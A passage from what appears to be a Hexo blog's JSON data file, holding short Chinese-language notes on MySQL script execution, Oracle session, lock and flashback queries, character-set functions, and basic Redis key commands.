0</span><br><span class=\"line\">trx_autocommit_non_locking: 0</span><br><span class=\"line\">1 row in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; kill 28961;</span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure></p>\n"},{"title":"mysql执行脚本","date":"2018-07-10T13:09:19.000Z","_content":"```\r\n、创建包含sql命令的sql脚本文件\r\n文件中包含一些列的sql语句，每条语句最后以;结尾，文件内容示例如下：\r\n--创建表，使用“--”进行注释\r\ncreate table 表名称\r\n(                   \r\n  Guid Varchar(38) not null primary key,  \r\n  Title Varchar(255),       \r\n              \r\n) TYPE=InnoDB;\r\n--在表A中增加字段Status\r\nalter table A add Status TinyInt default '0';\r\n--在表A上创建索引\r\ncreate index XX_TaskId_1 on A(Id_);\r\n--在A表中添加一条记录\r\nInsert into A (Id,ParentId, Name) values(1,0,'名称');\r\n--添加、修改、删除数据后，有可能需要提交事务\r\nCommit;\r\n2、执行sql脚本文件\r\n方法一 使用cmd命令执行(windows下，unix或linux在的其控制台下)\r\n【Mysql的bin目录】\\mysql –u用户名 –p密码 –D数据库<【sql脚本文件路径全名】，示例：\r\nD:\\mysql\\bin\\mysql –uroot –p123456 -Dtest<d:\\test\\ss.sql\r\n注意：\r\nA、如果在sql脚本文件中使用了use 数据库，则-D数据库选项可以忽略\r\nB、如果【Mysql的bin目录】中包含空格，则需要使用“”包含，如：“C:\\Program Files\\mysql\\bin\\mysql” –u用户名 –p密码 –D数据库<【sql脚本文件路径全名】\r\n\r\n方法二 进入mysql的控制台后，使用source命令执行\r\nMysql>source 【sql脚本文件的路径全名】 或 Mysql>\\. 【sql脚本文件的路径全名】，示例：\r\nsource d:\\test\\ss.sql 或者 \\. d:\\test\\ss.sql","source":"_posts/数据库/mysql/mysql执行脚本.md","raw":"---\ntitle: mysql执行脚本\ndate: 2018-07-10 21:09:19\ntags: mysql\n---\n```\r\n、创建包含sql命令的sql脚本文件\r\n文件中包含一些列的sql语句，每条语句最后以;结尾，文件内容示例如下：\r\n--创建表，使用“--”进行注释\r\ncreate table 表名称\r\n(                   \r\n  Guid Varchar(38) not null primary key,  \r\n  Title Varchar(255),       \r\n              \r\n) TYPE=InnoDB;\r\n--在表A中增加字段Status\r\nalter table A add Status TinyInt default '0';\r\n--在表A上创建索引\r\ncreate index XX_TaskId_1 on A(Id_);\r\n--在A表中添加一条记录\r\nInsert into A (Id,ParentId, Name) values(1,0,'名称');\r\n--添加、修改、删除数据后，有可能需要提交事务\r\nCommit;\r\n2、执行sql脚本文件\r\n方法一 使用cmd命令执行(windows下，unix或linux在的其控制台下)\r\n【Mysql的bin目录】\\mysql –u用户名 –p密码 –D数据库<【sql脚本文件路径全名】，示例：\r\nD:\\mysql\\bin\\mysql –uroot –p123456 -Dtest<d:\\test\\ss.sql\r\n注意：\r\nA、如果在sql脚本文件中使用了use 数据库，则-D数据库选项可以忽略\r\nB、如果【Mysql的bin目录】中包含空格，则需要使用“”包含，如：“C:\\Program Files\\mysql\\bin\\mysql” –u用户名 –p密码 –D数据库<【sql脚本文件路径全名】\r\n\r\n方法二 进入mysql的控制台后，使用source命令执行\r\nMysql>source 【sql脚本文件的路径全名】 或 Mysql>\\. 【sql脚本文件的路径全名】，示例：\r\nsource d:\\test\\ss.sql 或者 \\. d:\\test\\ss.sql","slug":"数据库/mysql/mysql执行脚本","published":1,"updated":"2018-07-10T13:10:10.013Z","_id":"cjjedmhdj009w0gtjadu6fa2q","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>、创建包含sql命令的sql脚本文件<br>文件中包含一些列的sql语句，每条语句最后以;结尾，文件内容示例如下：<br>–创建表，使用“–”进行注释<br>create table 表名称<br>(<br>  Guid Varchar(38) not null primary key,<br>  Title Varchar(255),       </p>\n<p>) TYPE=InnoDB;<br>–在表A中增加字段Status<br>alter table A add Status TinyInt default ‘0’;<br>–在表A上创建索引<br>create index XX_TaskId_1 on A(Id_);<br>–在A表中添加一条记录<br>Insert into A (Id,ParentId, Name) values(1,0,’名称’);<br>–添加、修改、删除数据后，有可能需要提交事务<br>Commit;<br>2、执行sql脚本文件<br>方法一 使用cmd命令执行(windows下，unix或linux在的其控制台下)<br>【Mysql的bin目录】\\mysql –u用户名 –p密码 –D数据库&lt;【sql脚本文件路径全名】，示例：<br>D:\\mysql\\bin\\mysql –uroot –p123456 -Dtest&lt;d:\\test\\ss.sql<br>注意：<br>A、如果在sql脚本文件中使用了use 数据库，则-D数据库选项可以忽略<br>B、如果【Mysql的bin目录】中包含空格，则需要使用“”包含，如：“C:\\Program Files\\mysql\\bin\\mysql” –u用户名 –p密码 –D数据库&lt;【sql脚本文件路径全名】</p>\n<p>方法二 进入mysql的控制台后，使用source命令执行<br>Mysql&gt;source 【sql脚本文件的路径全名】 或 Mysql&gt;. 【sql脚本文件的路径全名】，示例：<br>source d:\\test\\ss.sql 或者 . d:\\test\\ss.sql</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>、创建包含sql命令的sql脚本文件<br>文件中包含一些列的sql语句，每条语句最后以;结尾，文件内容示例如下：<br>–创建表，使用“–”进行注释<br>create table 表名称<br>(<br>  Guid Varchar(38) not null primary key,<br>  Title Varchar(255),       </p>\n<p>) TYPE=InnoDB;<br>–在表A中增加字段Status<br>alter table A add Status TinyInt default ‘0’;<br>–在表A上创建索引<br>create index XX_TaskId_1 on A(Id_);<br>–在A表中添加一条记录<br>Insert into A (Id,ParentId, Name) values(1,0,’名称’);<br>–添加、修改、删除数据后，有可能需要提交事务<br>Commit;<br>2、执行sql脚本文件<br>方法一 使用cmd命令执行(windows下，unix或linux在的其控制台下)<br>【Mysql的bin目录】\\mysql –u用户名 –p密码 –D数据库&lt;【sql脚本文件路径全名】，示例：<br>D:\\mysql\\bin\\mysql –uroot –p123456 -Dtest&lt;d:\\test\\ss.sql<br>注意：<br>A、如果在sql脚本文件中使用了use 数据库，则-D数据库选项可以忽略<br>B、如果【Mysql的bin目录】中包含空格，则需要使用“”包含，如：“C:\\Program Files\\mysql\\bin\\mysql” –u用户名 –p密码 –D数据库&lt;【sql脚本文件路径全名】</p>\n<p>方法二 进入mysql的控制台后，使用source命令执行<br>Mysql&gt;source 【sql脚本文件的路径全名】 或 Mysql&gt;. 【sql脚本文件的路径全名】，示例：<br>source d:\\test\\ss.sql 或者 . d:\\test\\ss.sql</p>\n"},{"title":"mysql问题处理","date":"2018-07-10T13:09:19.000Z","_content":"[MySQL出现Waiting for table metadata lock的原因以及解决方法](https://www.cnblogs.com/digdeep/p/4892953.html)","source":"_posts/数据库/mysql/mysql问题处理.md","raw":"---\ntitle: mysql问题处理\ndate: 2018-07-10 21:09:19\ntags: mysql\n---\n[MySQL出现Waiting for table metadata lock的原因以及解决方法](https://www.cnblogs.com/digdeep/p/4892953.html)","slug":"数据库/mysql/mysql问题处理","published":1,"updated":"2018-07-10T13:10:10.014Z","_id":"cjjedmhdj009y0gtj9l4qazmr","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"https://www.cnblogs.com/digdeep/p/4892953.html\" target=\"_blank\" rel=\"noopener\">MySQL出现Waiting for table metadata lock的原因以及解决方法</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"https://www.cnblogs.com/digdeep/p/4892953.html\" target=\"_blank\" rel=\"noopener\">MySQL出现Waiting for table metadata lock的原因以及解决方法</a></p>\n"},{"title":"查看编码和字符集转化","date":"2018-07-10T13:09:20.000Z","_content":"查看数据库编码\n\n    select * from nls_database_parameters;\n\n    SELECT userenv('language') FROM dual;\n\n1、chr()\n\nchr()函数是将ASCII码转换为字符：ASCII码 -> 字符，ASCII码对应的字符可以参见本文后面的ASCII编码表。\n\n2、ascii()\n\nascii()函数是chr()的反函数，它表示将字符转换为ASCII码：字符 -> ASCII码。\n\n3、asciistr()\n\nasciistr()函数是将字符串转换为ascii字符串\n\n4、convert()\n\nconvert() 函数的转换是用于将字符串从一个字符集转化为另一个字符集，函数形式：convert(char, dest_char_set [, source_char_set])，其中char表示要转换的字符串，dest_char_set表示要转换成的目的字符 集，source_char_set是char的原本字符集，如果缺省，则默认是数据库的字符集。","source":"_posts/数据库/oracle/查看编码和字符集转化.md","raw":"---\ntitle: 查看编码和字符集转化\ndate: 2018-07-10 21:09:20\ntags: oracle\n---\n查看数据库编码\n\n    select * from nls_database_parameters;\n\n    SELECT userenv('language') FROM dual;\n\n1、chr()\n\nchr()函数是将ASCII码转换为字符：ASCII码 -> 字符，ASCII码对应的字符可以参见本文后面的ASCII编码表。\n\n2、ascii()\n\nascii()函数是chr()的反函数，它表示将字符转换为ASCII码：字符 -> ASCII码。\n\n3、asciistr()\n\nasciistr()函数是将字符串转换为ascii字符串\n\n4、convert()\n\nconvert() 函数的转换是用于将字符串从一个字符集转化为另一个字符集，函数形式：convert(char, dest_char_set [, source_char_set])，其中char表示要转换的字符串，dest_char_set表示要转换成的目的字符 集，source_char_set是char的原本字符集，如果缺省，则默认是数据库的字符集。","slug":"数据库/oracle/查看编码和字符集转化","published":1,"updated":"2018-07-10T13:10:10.020Z","_id":"cjjedmhdl00a10gtj4t2v0p92","comments":1,"layout":"post","photos":[],"link":"","content":"<p>查看数据库编码</p>\n<pre><code>select * from nls_database_parameters;\n\nSELECT userenv(&apos;language&apos;) FROM dual;\n</code></pre><p>1、chr()</p>\n<p>chr()函数是将ASCII码转换为字符：ASCII码 -&gt; 字符，ASCII码对应的字符可以参见本文后面的ASCII编码表。</p>\n<p>2、ascii()</p>\n<p>ascii()函数是chr()的反函数，它表示将字符转换为ASCII码：字符 -&gt; ASCII码。</p>\n<p>3、asciistr()</p>\n<p>asciistr()函数是将字符串转换为ascii字符串</p>\n<p>4、convert()</p>\n<p>convert() 函数的转换是用于将字符串从一个字符集转化为另一个字符集，函数形式：convert(char, dest_char_set [, source_char_set])，其中char表示要转换的字符串，dest_char_set表示要转换成的目的字符 集，source_char_set是char的原本字符集，如果缺省，则默认是数据库的字符集。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>查看数据库编码</p>\n<pre><code>select * from nls_database_parameters;\n\nSELECT userenv(&apos;language&apos;) FROM dual;\n</code></pre><p>1、chr()</p>\n<p>chr()函数是将ASCII码转换为字符：ASCII码 -&gt; 字符，ASCII码对应的字符可以参见本文后面的ASCII编码表。</p>\n<p>2、ascii()</p>\n<p>ascii()函数是chr()的反函数，它表示将字符转换为ASCII码：字符 -&gt; ASCII码。</p>\n<p>3、asciistr()</p>\n<p>asciistr()函数是将字符串转换为ascii字符串</p>\n<p>4、convert()</p>\n<p>convert() 函数的转换是用于将字符串从一个字符集转化为另一个字符集，函数形式：convert(char, dest_char_set [, source_char_set])，其中char表示要转换的字符串，dest_char_set表示要转换成的目的字符 集，source_char_set是char的原本字符集，如果缺省，则默认是数据库的字符集。</p>\n"},{"title":"the account is locked","date":"2018-07-10T13:09:20.000Z","_content":"ALTER USER HS_his ACCOUNT UNLOCK;","source":"_posts/数据库/oracle/the account is locked.md","raw":"---\ntitle: the account is locked\ndate: 2018-07-10 21:09:20\ntags: oracle\n---\nALTER USER HS_his ACCOUNT UNLOCK;","slug":"数据库/oracle/the account is locked","published":1,"updated":"2018-07-10T13:10:10.018Z","_id":"cjjedmhdm00a30gtjzw6dkv2u","comments":1,"layout":"post","photos":[],"link":"","content":"<p>ALTER USER HS_his ACCOUNT UNLOCK;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>ALTER USER HS_his ACCOUNT UNLOCK;</p>\n"},{"title":"oracle","date":"2018-07-10T13:09:20.000Z","_content":"- #### 查看表结构\n```\n describe nchar_tst\n```\n- #### 查操作记录\n    \n    select t.SQL_TEXT, t.FIRST_LOAD_TIME\n    from v$sqlarea t\n    where t.SQL_TEXT like 'delete%' and t.FIRST_LOAD_TIME like '2017%'\n    order by t.FIRST_LOAD_TIME desc;\n    \n- #### 锁表\n```\nselect b.OBJECT_NAME,a.ORACLE_USERNAME,a.OS_USER_NAME,a.PROCESS, c.program,c.terminal,c.sid,c.serial#\nfrom V$LOCKED_OBJECT a,DBA_OBJECTS b,v$session c where   (a.OBJECT_ID=b.OBJECT_ID and c.sid=a.session_id)\norder by a.ORACLE_USERNAME,b.OBJECT_NAME;\n\nalter system kill session '198,240';\n```\n\n- #### 会话数太多\n> ORA-12516: TNS: 监听程序无法找到匹配协议栈的可用句柄.\nTNS-12516 TNS:listener could not find available handler with matching protocol stack\n\n查看会话数：\n```\nselect count(*) from v$session;\n```\n\n[解决办法](http://www.open-open.com/lib/view/open1338520588261.html)\n\n[Oracle中会话的状态](http://blog.csdn.net/haiross/article/details/43447353)\n\n- #### java.sql.SQLException: ORA-00911: 无效字符\nsql多了一个\";\" 去掉就可以了\n\n- #### 查看建表语句\n\nselect dbms_metadata.get_ddl('TABLE','ELIGRISKMATCH') from dual;\n\n- #### 恢复数据\n\n[恢复数据](http://www.cnblogs.com/chaizp/p/5192522.html)\n```\nselect * from hs_his.his_clientinfojour AS OF TIMESTAMP  (SYSTIMESTAMP - INTERVAL '100' MINUTE);\n\nselect * from hs_his.his_clientinfojour as of timestamp to_timestamp('2017-11-01 01:00:00','YYYY-MM-DD HH24:MI:SS');\n\nselect timestamp_to_scn(to_timestamp('2017-11-01 01:00:00','YYYY-MM-DD HH:MI:SS')) from dual;\n```\n\n- #### 查操作记录\n\n```\nselect t.SQL_TEXT, t.FIRST_LOAD_TIME\nfrom v$sqlarea t\n where t.FIRST_LOAD_TIME like '2010-06-30%'\n order by t.FIRST_LOAD_TIME desc\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/数据库/oracle/oracle.md","raw":"---\ntitle: oracle\ndate: 2018-07-10 21:09:20\ntags: oracle\n---\n- #### 查看表结构\n```\n describe nchar_tst\n```\n- #### 查操作记录\n    \n    select t.SQL_TEXT, t.FIRST_LOAD_TIME\n    from v$sqlarea t\n    where t.SQL_TEXT like 'delete%' and t.FIRST_LOAD_TIME like '2017%'\n    order by t.FIRST_LOAD_TIME desc;\n    \n- #### 锁表\n```\nselect b.OBJECT_NAME,a.ORACLE_USERNAME,a.OS_USER_NAME,a.PROCESS, c.program,c.terminal,c.sid,c.serial#\nfrom V$LOCKED_OBJECT a,DBA_OBJECTS b,v$session c where   (a.OBJECT_ID=b.OBJECT_ID and c.sid=a.session_id)\norder by a.ORACLE_USERNAME,b.OBJECT_NAME;\n\nalter system kill session '198,240';\n```\n\n- #### 会话数太多\n> ORA-12516: TNS: 监听程序无法找到匹配协议栈的可用句柄.\nTNS-12516 TNS:listener could not find available handler with matching protocol stack\n\n查看会话数：\n```\nselect count(*) from v$session;\n```\n\n[解决办法](http://www.open-open.com/lib/view/open1338520588261.html)\n\n[Oracle中会话的状态](http://blog.csdn.net/haiross/article/details/43447353)\n\n- #### java.sql.SQLException: ORA-00911: 无效字符\nsql多了一个\";\" 去掉就可以了\n\n- #### 查看建表语句\n\nselect dbms_metadata.get_ddl('TABLE','ELIGRISKMATCH') from dual;\n\n- #### 恢复数据\n\n[恢复数据](http://www.cnblogs.com/chaizp/p/5192522.html)\n```\nselect * from hs_his.his_clientinfojour AS OF TIMESTAMP  (SYSTIMESTAMP - INTERVAL '100' MINUTE);\n\nselect * from hs_his.his_clientinfojour as of timestamp to_timestamp('2017-11-01 01:00:00','YYYY-MM-DD HH24:MI:SS');\n\nselect timestamp_to_scn(to_timestamp('2017-11-01 01:00:00','YYYY-MM-DD HH:MI:SS')) from dual;\n```\n\n- #### 查操作记录\n\n```\nselect t.SQL_TEXT, t.FIRST_LOAD_TIME\nfrom v$sqlarea t\n where t.FIRST_LOAD_TIME like '2010-06-30%'\n order by t.FIRST_LOAD_TIME desc\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"数据库/oracle/oracle","published":1,"updated":"2018-07-10T13:10:10.017Z","_id":"cjjedmhdn00a50gtjidsn9tkk","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"查看表结构\"><a href=\"#查看表结构\" class=\"headerlink\" title=\"查看表结构\"></a>查看表结构</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">describe nchar_tst</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"查操作记录\"><a href=\"#查操作记录\" class=\"headerlink\" title=\"查操作记录\"></a>查操作记录</h4><p>  select t.SQL_TEXT, t.FIRST_LOAD_TIME<br>  from v$sqlarea t<br>  where t.SQL_TEXT like ‘delete%’ and t.FIRST_LOAD_TIME like ‘2017%’<br>  order by t.FIRST_LOAD_TIME desc;</p>\n</li>\n<li><h4 id=\"锁表\"><a href=\"#锁表\" class=\"headerlink\" title=\"锁表\"></a>锁表</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select b.OBJECT_NAME,a.ORACLE_USERNAME,a.OS_USER_NAME,a.PROCESS, c.program,c.terminal,c.sid,c.serial#</span><br><span class=\"line\">from V$LOCKED_OBJECT a,DBA_OBJECTS b,v$session c where   (a.OBJECT_ID=b.OBJECT_ID and c.sid=a.session_id)</span><br><span class=\"line\">order by a.ORACLE_USERNAME,b.OBJECT_NAME;</span><br><span class=\"line\"></span><br><span class=\"line\">alter system kill session &apos;198,240&apos;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"会话数太多\"><a href=\"#会话数太多\" class=\"headerlink\" title=\"会话数太多\"></a>会话数太多</h4><blockquote>\n<p>ORA-12516: TNS: 监听程序无法找到匹配协议栈的可用句柄.<br>TNS-12516 TNS:listener could not find available handler with matching protocol stack</p>\n</blockquote>\n</li>\n</ul>\n<p>查看会话数：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*) from v$session;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://www.open-open.com/lib/view/open1338520588261.html\" target=\"_blank\" rel=\"noopener\">解决办法</a></p>\n<p><a href=\"http://blog.csdn.net/haiross/article/details/43447353\" target=\"_blank\" rel=\"noopener\">Oracle中会话的状态</a></p>\n<ul>\n<li><h4 id=\"java-sql-SQLException-ORA-00911-无效字符\"><a href=\"#java-sql-SQLException-ORA-00911-无效字符\" class=\"headerlink\" title=\"java.sql.SQLException: ORA-00911: 无效字符\"></a>java.sql.SQLException: ORA-00911: 无效字符</h4><p>sql多了一个”;” 去掉就可以了</p>\n</li>\n<li><h4 id=\"查看建表语句\"><a href=\"#查看建表语句\" class=\"headerlink\" title=\"查看建表语句\"></a>查看建表语句</h4></li>\n</ul>\n<p>select dbms_metadata.get_ddl(‘TABLE’,’ELIGRISKMATCH’) from dual;</p>\n<ul>\n<li><h4 id=\"恢复数据\"><a href=\"#恢复数据\" class=\"headerlink\" title=\"恢复数据\"></a>恢复数据</h4></li>\n</ul>\n<p><a href=\"http://www.cnblogs.com/chaizp/p/5192522.html\" target=\"_blank\" rel=\"noopener\">恢复数据</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from hs_his.his_clientinfojour AS OF TIMESTAMP  (SYSTIMESTAMP - INTERVAL &apos;100&apos; MINUTE);</span><br><span class=\"line\"></span><br><span class=\"line\">select * from hs_his.his_clientinfojour as of timestamp to_timestamp(&apos;2017-11-01 01:00:00&apos;,&apos;YYYY-MM-DD HH24:MI:SS&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">select timestamp_to_scn(to_timestamp(&apos;2017-11-01 01:00:00&apos;,&apos;YYYY-MM-DD HH:MI:SS&apos;)) from dual;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"查操作记录-1\"><a href=\"#查操作记录-1\" class=\"headerlink\" title=\"查操作记录\"></a>查操作记录</h4></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select t.SQL_TEXT, t.FIRST_LOAD_TIME</span><br><span class=\"line\">from v$sqlarea t</span><br><span class=\"line\"> where t.FIRST_LOAD_TIME like &apos;2010-06-30%&apos;</span><br><span class=\"line\"> order by t.FIRST_LOAD_TIME desc</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"查看表结构\"><a href=\"#查看表结构\" class=\"headerlink\" title=\"查看表结构\"></a>查看表结构</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">describe nchar_tst</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"查操作记录\"><a href=\"#查操作记录\" class=\"headerlink\" title=\"查操作记录\"></a>查操作记录</h4><p>  select t.SQL_TEXT, t.FIRST_LOAD_TIME<br>  from v$sqlarea t<br>  where t.SQL_TEXT like ‘delete%’ and t.FIRST_LOAD_TIME like ‘2017%’<br>  order by t.FIRST_LOAD_TIME desc;</p>\n</li>\n<li><h4 id=\"锁表\"><a href=\"#锁表\" class=\"headerlink\" title=\"锁表\"></a>锁表</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select b.OBJECT_NAME,a.ORACLE_USERNAME,a.OS_USER_NAME,a.PROCESS, c.program,c.terminal,c.sid,c.serial#</span><br><span class=\"line\">from V$LOCKED_OBJECT a,DBA_OBJECTS b,v$session c where   (a.OBJECT_ID=b.OBJECT_ID and c.sid=a.session_id)</span><br><span class=\"line\">order by a.ORACLE_USERNAME,b.OBJECT_NAME;</span><br><span class=\"line\"></span><br><span class=\"line\">alter system kill session &apos;198,240&apos;;</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"会话数太多\"><a href=\"#会话数太多\" class=\"headerlink\" title=\"会话数太多\"></a>会话数太多</h4><blockquote>\n<p>ORA-12516: TNS: 监听程序无法找到匹配协议栈的可用句柄.<br>TNS-12516 TNS:listener could not find available handler with matching protocol stack</p>\n</blockquote>\n</li>\n</ul>\n<p>查看会话数：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select count(*) from v$session;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"http://www.open-open.com/lib/view/open1338520588261.html\" target=\"_blank\" rel=\"noopener\">解决办法</a></p>\n<p><a href=\"http://blog.csdn.net/haiross/article/details/43447353\" target=\"_blank\" rel=\"noopener\">Oracle中会话的状态</a></p>\n<ul>\n<li><h4 id=\"java-sql-SQLException-ORA-00911-无效字符\"><a href=\"#java-sql-SQLException-ORA-00911-无效字符\" class=\"headerlink\" title=\"java.sql.SQLException: ORA-00911: 无效字符\"></a>java.sql.SQLException: ORA-00911: 无效字符</h4><p>sql多了一个”;” 去掉就可以了</p>\n</li>\n<li><h4 id=\"查看建表语句\"><a href=\"#查看建表语句\" class=\"headerlink\" title=\"查看建表语句\"></a>查看建表语句</h4></li>\n</ul>\n<p>select dbms_metadata.get_ddl(‘TABLE’,’ELIGRISKMATCH’) from dual;</p>\n<ul>\n<li><h4 id=\"恢复数据\"><a href=\"#恢复数据\" class=\"headerlink\" title=\"恢复数据\"></a>恢复数据</h4></li>\n</ul>\n<p><a href=\"http://www.cnblogs.com/chaizp/p/5192522.html\" target=\"_blank\" rel=\"noopener\">恢复数据</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select * from hs_his.his_clientinfojour AS OF TIMESTAMP  (SYSTIMESTAMP - INTERVAL &apos;100&apos; MINUTE);</span><br><span class=\"line\"></span><br><span class=\"line\">select * from hs_his.his_clientinfojour as of timestamp to_timestamp(&apos;2017-11-01 01:00:00&apos;,&apos;YYYY-MM-DD HH24:MI:SS&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">select timestamp_to_scn(to_timestamp(&apos;2017-11-01 01:00:00&apos;,&apos;YYYY-MM-DD HH:MI:SS&apos;)) from dual;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><h4 id=\"查操作记录-1\"><a href=\"#查操作记录-1\" class=\"headerlink\" title=\"查操作记录\"></a>查操作记录</h4></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select t.SQL_TEXT, t.FIRST_LOAD_TIME</span><br><span class=\"line\">from v$sqlarea t</span><br><span class=\"line\"> where t.FIRST_LOAD_TIME like &apos;2010-06-30%&apos;</span><br><span class=\"line\"> order by t.FIRST_LOAD_TIME desc</span><br></pre></td></tr></table></figure>\n"},{"title":"redis 命令","date":"2018-07-10T13:09:20.000Z","_content":"[菜鸟教程]()\n\n[redis爱好者](http://doc.redisfans.com/)\n\n查看所有key\n```\nkeys * #*可以是正则表达式\n\nKEYS pattern\n查找所有符合给定模式 pattern 的 key 。\n\nKEYS * 匹配数据库中所有 key 。\nKEYS h?llo 匹配 hello ， hallo 和 hxllo 等。\nKEYS h*llo 匹配 hllo 和 heeeeello 等。\nKEYS h[ae]llo 匹配 hello 和 hallo ，但不匹配 hillo 。\n特殊符号用 \\ 隔开\n```\n设置key\n\n    set keyname keyvalue\n\n取String类型key的值\n\n    get keyname\n取List类型key的值\n\n    lrange kenanme 0 -1 #0,-1是起始位置\n\n删除\n\n    del key\n\n批量删除\n\n    ./redis-cli keys \"a-*\" | xargs ./redis-cli del","source":"_posts/数据库/redis/redis 命令.md","raw":"---\ntitle: redis 命令\ndate: 2018-07-10 21:09:20\ntags: redis\n---\n[菜鸟教程]()\n\n[redis爱好者](http://doc.redisfans.com/)\n\n查看所有key\n```\nkeys * #*可以是正则表达式\n\nKEYS pattern\n查找所有符合给定模式 pattern 的 key 。\n\nKEYS * 匹配数据库中所有 key 。\nKEYS h?llo 匹配 hello ， hallo 和 hxllo 等。\nKEYS h*llo 匹配 hllo 和 heeeeello 等。\nKEYS h[ae]llo 匹配 hello 和 hallo ，但不匹配 hillo 。\n特殊符号用 \\ 隔开\n```\n设置key\n\n    set keyname keyvalue\n\n取String类型key的值\n\n    get keyname\n取List类型key的值\n\n    lrange kenanme 0 -1 #0,-1是起始位置\n\n删除\n\n    del key\n\n批量删除\n\n    ./redis-cli keys \"a-*\" | xargs ./redis-cli del","slug":"数据库/redis/redis 命令","published":1,"updated":"2018-07-10T13:10:10.021Z","_id":"cjjedmhdo00a70gtju9hv69ns","comments":1,"layout":"post","photos":[],"link":"","content":"<p><a href=\"\">菜鸟教程</a></p>\n<p><a href=\"http://doc.redisfans.com/\" target=\"_blank\" rel=\"noopener\">redis爱好者</a></p>\n<p>查看所有key<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">keys * #*可以是正则表达式</span><br><span class=\"line\"></span><br><span class=\"line\">KEYS pattern</span><br><span class=\"line\">查找所有符合给定模式 pattern 的 key 。</span><br><span class=\"line\"></span><br><span class=\"line\">KEYS * 匹配数据库中所有 key 。</span><br><span class=\"line\">KEYS h?llo 匹配 hello ， hallo 和 hxllo 等。</span><br><span class=\"line\">KEYS h*llo 匹配 hllo 和 heeeeello 等。</span><br><span class=\"line\">KEYS h[ae]llo 匹配 hello 和 hallo ，但不匹配 hillo 。</span><br><span class=\"line\">特殊符号用 \\ 隔开</span><br></pre></td></tr></table></figure></p>\n<p>设置key</p>\n<pre><code>set keyname keyvalue\n</code></pre><p>取String类型key的值</p>\n<pre><code>get keyname\n</code></pre><p>取List类型key的值</p>\n<pre><code>lrange kenanme 0 -1 #0,-1是起始位置\n</code></pre><p>删除</p>\n<pre><code>del key\n</code></pre><p>批量删除</p>\n<pre><code>./redis-cli keys &quot;a-*&quot; | xargs ./redis-cli del\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p><a href=\"\">菜鸟教程</a></p>\n<p><a href=\"http://doc.redisfans.com/\" target=\"_blank\" rel=\"noopener\">redis爱好者</a></p>\n<p>查看所有key<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span 